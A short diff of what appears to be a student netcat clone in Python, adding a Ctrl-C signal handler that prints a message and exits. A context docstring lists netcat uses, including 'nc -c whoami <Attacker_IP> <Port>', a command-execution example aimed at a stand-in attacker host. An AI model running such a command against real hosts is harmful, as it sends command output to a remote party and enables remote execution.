@@ -17,8 +17,14 @@ For this project, i want to implement just some type of netcat:
 		* command execution : nc -c whoami <Attacker_IP> <Port>
 """
 import sys
+import signal
 import subprocess
 import ft_parser, ft_client, ft_server
+
+
+def	signal_handler(sigNum, frame):
+	print("\nExit with sigint")
+	sys.exit(0)
 
 def	execute(args):
 	print("execute cmd")
@@ -45,6 +51,7 @@ def main():
 	print("main")
 
 if __name__ == "__main__":
+	signal.signal(signal.SIGINT, signal_handler)
 	args = ft_parser.parse()
 	print(args)
 	ft_parser.checkArgs(args)
